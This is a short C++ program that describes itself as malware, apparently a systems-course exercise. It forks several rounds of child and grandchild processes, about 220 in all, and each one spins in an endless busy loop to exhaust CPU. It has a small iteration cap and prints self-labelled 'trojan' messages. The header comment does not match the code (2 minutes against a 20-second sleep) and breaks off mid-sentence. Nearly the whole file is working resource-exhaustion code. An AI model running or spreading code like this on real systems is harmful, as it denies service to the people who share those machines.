/*
    * a cpp file to implement a malware which spawns mutiple child processes and goes to sleep
    * the child processes spawn more child processes and go to sleep
    * 
    * Process P sleeps for 2 minutes and then wakes up to spawn 5 processes and goes to sleep again
    * Each of the child processes 
*/
#include <iostream>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

using namespace std;

static void stagnate() {
    while(1) __asm("");
}

// sleep time in seconds
#define SLEEP_TIME 20
// for safety, we will run the malware for 4 iterations
#define ITER_0 4
#define ITER_1 5
#define ITER_2 10

signed main()
{
    cout << "Hi, I am a trojan :) with pid = " << getpid() << endl;
    // recursively sleep and spawn 5 child processes
    int i = 0;
    while (i++ < ITER_0)
    {

        // wake up and spawn 5 child processes
        for (int i = 0; i < ITER_1; ++i)
        {
            pid_t pid = fork();
            if (pid == 0)
            {
                cout << "Hola! I am a trojan-child with pid = " << getpid() << endl;
                // child process
                // spawn 10 more child processes and run in an infinite loop
                for (int j = 0; j < ITER_2; ++j)
                {
                    pid_t pid = fork();
                    if (pid == 0)
                    {
                        // child process
                        // run in an infinite loop
                        cout << "Hello, I am a trojan-grandchild with pid = " << getpid() << endl;
                        stagnate();
                        exit(0);
                    }
                }
                // run in an infinite loop
                stagnate();
            }
        }

        // sleep for SLEEP_TIME seconds
        sleep(SLEEP_TIME);
    }

    return 0;
}